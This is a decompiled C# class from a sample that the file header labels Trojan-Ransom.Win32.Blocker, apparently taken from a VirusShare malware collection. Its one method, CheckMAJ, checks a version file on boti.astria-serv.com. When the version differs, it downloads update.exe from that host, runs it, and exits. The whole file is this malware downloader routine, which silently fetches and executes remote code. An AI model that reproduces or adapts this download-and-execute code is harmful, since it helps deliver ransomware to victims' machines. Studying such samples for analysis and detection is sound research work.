// Decompiled with JetBrains decompiler
// Type: network.MAJ
// Assembly: network, Version=1.0.0.6, Culture=neutral, PublicKeyToken=null
// MVID: B0A24E30-B253-4D4D-B01C-24ADDB2ED5EA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00033-msil\Trojan-Ransom.Win32.Blocker.ahhr-2d8467fb99e7020f788639b2a01340f22a0724c95184d9bd912f39130e095d14.exe.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using network.My;
using System;
using System.Net;
using System.Runtime.CompilerServices;

namespace network
{
  [StandardModule]
  internal sealed class MAJ
  {
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    internal static void CheckMAJ()
    {
      WebClient webClient = new WebClient();
      try
      {
        if (Operators.CompareString(webClient.DownloadString("http://boti.astria-serv.com/version.txt"), MyProject.Application.Info.Version.ToString(), false) != 0)
        {
          webClient.DownloadFile("http://boti.astria-serv.com/update.exe", "update.exe");
          Interaction.Shell("update.exe");
          ProjectData.EndApp();
        }
        if (System.IO.File.Exists("update.exe"))
          System.IO.File.Delete("update.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.EndApp();
        ProjectData.ClearProjectError();
      }
      webClient.Dispose();
    }
  }
}
